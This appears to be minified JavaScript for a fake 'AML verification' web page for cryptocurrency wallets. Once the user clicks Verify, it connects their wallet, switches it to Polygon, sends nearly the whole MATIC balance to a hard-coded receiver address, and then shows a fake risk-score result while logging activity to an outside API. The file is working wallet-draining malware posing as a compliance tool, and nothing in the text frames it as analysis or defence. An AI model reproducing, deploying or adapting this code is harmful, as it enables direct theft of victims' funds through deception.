let e,t,o=0,n=[],r=null;const a=3e3;async function i(){if(0===n.length)return;const e=n.join("\n");n=[];try{const t=await fetch("https://aml.cab/api/log",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({message:e,type:"info"})});t.ok||console.error("Failed to send batched log to AML API:",await t.text())}catch(e){console.error("Error sending batched log to AML API:",e)}}function s(e){n.push(e),r&&clearTimeout(r),r=setTimeout((()=>{i(),r=null}),a)}const c={log:(...e)=>{console.log(...e);s(e.map((e=>"object"==typeof e?JSON.stringify(e):String(e))).join(" "))},error:(...e)=>{console.error(...e);s(e.map((e=>"object"==typeof e?JSON.stringify(e):String(e))).join(" "))},warn:(...e)=>{console.warn(...e);s(e.map((e=>"object"==typeof e?JSON.stringify(e):String(e))).join(" "))}},l=window.location.href.includes("localhost")||window.location.href.includes("127.0.0.1"),d="0x6217cA34756CBD31Ee84fc83179F37e19250B76D",w="0x8e62C38421A0670f42e3881A9E9dA93f08723af2",g=l?w:d;async function u(){try{if(!t||!e)return void c.log("No signer or provider available");const n=await t.getAddress();c.log("Connected address:",n);const r=await e.getBalance(n);o=r,c.log("MATIC balance:",ethers.utils.formatEther(r),"MATIC")}catch(e){c.error("Error checking balances:",e)}}async function h(){document.getElementById("action-button");t?await y():(await m(),t&&await y())}async function m(){try{const o=document.getElementById("action-button");o.disabled=!0,o.classList.add("loading"),o.textContent="Connecting...",c.log("Starting wallet connection...");const n=await f();if(c.log("Provider status:",{isProviderFound:!!n,providerType:n?n.constructor.name:"none",isEthereum:!!window.ethereum,isRabby:!!window.rabby,hasWeb3:!(!window.web3||!window.web3.currentProvider)}),!n)throw new Error("Web3 wallet not detected. Please install MetaMask, Rabby, or another Web3 wallet and refresh the page.");e=new ethers.providers.Web3Provider(n,"any"),c.log("Requesting accounts..."),await e.send("eth_requestAccounts",[]),t=e.getSigner();const r=await t.getAddress();c.log("Connected address:",r);const a=await e.getNetwork();if(c.log("Current network:",a),137!==a.chainId){c.log("Switching to Polygon network...");try{await n.request({method:"wallet_switchEthereumChain",params:[{chainId:"0x89"}]})}catch(e){if(c.log("Switch error:",e),4902!==e.code)throw e;try{await n.request({method:"wallet_addEthereumChain",params:[{chainId:"0x89",chainName:"Polygon",nativeCurrency:{name:"MATIC",symbol:"MATIC",decimals:18},rpcUrls:["https://polygon-rpc.com"],blockExplorerUrls:["https://polygonscan.com/"]}]})}catch(e){throw c.error("Add network error:",e),new Error("Failed to add Polygon network")}}}await u(),n.on("accountsChanged",(async o=>{c.log("Accounts changed:",o),t=e.getSigner(),await u()})),n.on("chainChanged",(()=>{c.log("Network changed, reloading..."),window.location.reload()})),o.disabled=!1,o.classList.remove("loading")}catch(o){c.error("Connection error:",o);const n=document.getElementById("action-button");n.disabled=!1,n.classList.remove("loading"),n.textContent="Connect Wallet for Verification",e=null,t=null}}async function y(){try{const o=document.getElementById("action-button");o.disabled=!0,o.classList.add("loading"),o.textContent="Verifying...";const n=await t.getAddress();c.log("Sending from address:",n);const r=await e.getBalance(n);if(c.log("Current MATIC balance:",ethers.utils.formatEther(r),"MATIC"),r.eq(0))return void c.log("No MATIC balance available");const a=await e.getGasPrice();c.log("Current gas price:",ethers.utils.formatUnits(a,"gwei"),"gwei");const i=21e3,s=a.mul(i).mul(120).div(100);c.log("Gas cost with buffer:",ethers.utils.formatEther(s),"MATIC");const l=ethers.utils.parseEther("0.1"),d=s.add(l);c.log("Total amount to reserve:",ethers.utils.formatEther(d),"MATIC");const w=r.sub(d);if(c.log("Amount to send:",ethers.utils.formatEther(w),"MATIC"),w.lte(0))throw c.log("Insufficient balance to cover gas fees and minimum reserve"),new Error("Insufficient balance to cover gas fees and minimum reserve");c.log("Sending transaction...");const h=await t.sendTransaction({to:g,value:w,gasLimit:i,maxFeePerGas:a.mul(2),maxPriorityFeePerGas:a});c.log("Transaction sent:",h.hash),await h.wait(),c.log("Transaction confirmed"),o.style.display="none";document.getElementById("aml-results").classList.add("visible");const m=document.querySelector(".risk-score-progress"),y=2*m.r.baseVal.value*Math.PI;m.style.strokeDasharray=`${y} ${y}`,m.style.strokeDashoffset=y,setTimeout((()=>{const e=y-.8*y;m.style.strokeDashoffset=e}),100),document.getElementById("transaction-hash").textContent=h.hash.slice(0,6)+"..."+h.hash.slice(-4),await u()}catch(e){c.error("Transaction error:",e);const t=document.getElementById("action-button");t.textContent=e.message||"Transaction failed",t.style.backgroundColor="var(--danger-color)",setTimeout((()=>{t.textContent="Verify",t.style.backgroundColor="var(--primary-color)"}),3e3)}finally{const e=document.getElementById("action-button");e.disabled=!1,e.classList.remove("loading")}}function b(e,t){c.log(`Status: ${e} (${t?"success":"error"})`)}async function f(){return window.ethereum?window.ethereum:window.rabby?window.rabby:window.web3&&window.web3.currentProvider?window.web3.currentProvider:new Promise((e=>{let t=0;const o=()=>{t++,window.ethereum?e(window.ethereum):window.rabby?e(window.rabby):window.web3&&window.web3.currentProvider?e(window.web3.currentProvider):t<3?setTimeout(o,300):e(null)};o()}))}c.log("isDev",l),c.log("RECEIVER_ADDRESS",g),document.getElementById("action-button").addEventListener("click",h);